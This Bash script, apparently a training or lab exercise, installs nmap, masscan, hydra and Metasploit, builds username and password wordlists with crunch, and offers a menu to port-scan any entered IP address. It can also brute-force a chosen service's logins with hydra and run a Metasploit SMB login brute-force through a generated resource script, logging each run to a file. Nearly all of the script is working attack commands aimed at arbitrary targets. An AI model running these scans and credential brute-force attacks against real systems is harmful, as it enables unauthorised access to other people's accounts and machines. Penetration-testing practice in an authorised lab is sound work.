#!/bin/bash 

#Function for the updating and upgrading the user's machine and also install scanning and attacking software
function inst (){
	
#Fast update system before installing necessary scanning and attack tools
sudo apt update -y

#Upgrade the user's machine to the latest available version 
#sudo apt upgrade -y

#Install nmap a network scanner to detect hosts and services available on the local area network
#Nmap can be used by hackers to detect uncontrolled ports on a system
sudo apt-get install nmap -y

#Install masscan is a network port scanner similar in application to nmap but fast and able to scan in stealth
sudo apt-get install masscan -y

#Install hydra an open source tool to conduct various kind of brute force attacks 
#A login cracker which supports various protocols such as ftp ,ssh rdp etc 
sudo apt install hydra -y

#Install metasploit framework which will help the user later to probe a particular vulneranility which will be explained further in option -d of the function scanattacker
sudo apt-get install metasploit-framework -y
}

#Call the installation function for updates, upgrades and installations
inst

#Utilise crunch which comes in preinstalled with Kali Linux to generate lists
#Create a list of users which is needed for some attacks 
crunch 4 4 abcdefghijklmnopqrstuvwx > user.lst
#Create a list of passwords which is needed for some attacks
crunch 4 4 abcde > password.lst

#A function which allows the user to conduct nmap and masscans , and also carry out hydra and msfconsole smb brute force attacks
function scanattacker()
{

#Display all the options users can run 
read -p "Would you like to a) Run a nmap scan b) Run a masscan c) Run a hydra attack  d) Run mfsconsole-smb attack e) exit : " choices 

case $choices in 
	
	a)
		#User needs to enter the the target ip address they would like to do nmap scan
		echo 'Enter ip address to do a nmap'
		#Read ipaddress provided by user and store it in a variable
		read ip_addr
		echo "$ip_addr"

		#Conduct a namp scan on 1001 ports on the ipaddress provided by the user
		#The scan reuslts are kept in the nmap_scanresults text file which 
		#Results can be found in the same working directory where this script is run
		sudo nmap -p0-1000 $ip_addr >>nmap_scanresults.txt
		
		if [ $? -eq 0 ]; then
			echo `date` "sudo nmap -p0-1000 $ip_addr Executed" >>socchecker.txt
		else
			echo `date` "sudo nmap -p0-1000 $ip_addr Failed" >>socchecker.txt
		fi
		scanattacker
	;;
	
	b) 
		echo 'Enter ip address to do a masscan'
		read ip_addr
		echo "$ip_addr"
		sudo masscan $ip_addr -p 0-1000 --rate=10000 >>masscan_scanresults.txt
		
		if [ $? -eq 0 ]; then
			echo `date` "sudo masscan $ip_addr -p 0-1000 --rate=10000 Executed" >>socchecker.txt
		else
			echo `date` "sudo masscan $ip_addr -p 0-1000 --rate=10000 Failed" >>socchecker.txt
		fi
		scanattacker
	;;
	
	c)
		echo 'Enter ip address to do a hydra attack'
		read ip_addr
		echo "$ip_addr"
		echo 'Enter service you want to attack'
		read ser_name
		echo "$ser_name"
		sudo hydra  -L ./user.lst -P ./password.lst $ip_addr $ser_name -vV >>hydra_attackresult.txt
		
		if [ $? -eq 0 ]; then
			echo `date` "sudo hydra  -L ./user.lst -P ./password.lst $ip_addr $ser_name -vV Executed" >>socchecker.txt
		else
			echo `date` "sudo hydra  -L ./user.lst -P ./password.lst $ip_addr $ser_name -vV Failed" >>socchecker.txt
		fi
		scanattacker
	;;
	d)
		echo 'Enter ip address to do a msfconsole attack'
		read rhost_addr
		echo "$rhost_addr"
		echo 'use auxiliary/scanner/smb/smb_login' > smb_script.rc
		echo "set rhosts $rhost_addr" >> smb_script.rc
		echo 'set user_file user.lst' >> smb_script.rc
		echo 'set pass_file password.lst' >> smb_script.rc
		echo 'run' >> smb_script.rc
		echo 'exit' >> smb_script.rc
		sudo msfconsole -r smb_script.rc -o msf_smb_bf_results.txt
		echo `date` "msfconsole run on set rhost $rhost_addr and exited from console Executed" >>socchecker.txt
		scanattacker
	;;
	
	e)
		exit
	;;
esac
	
}
scanattacker


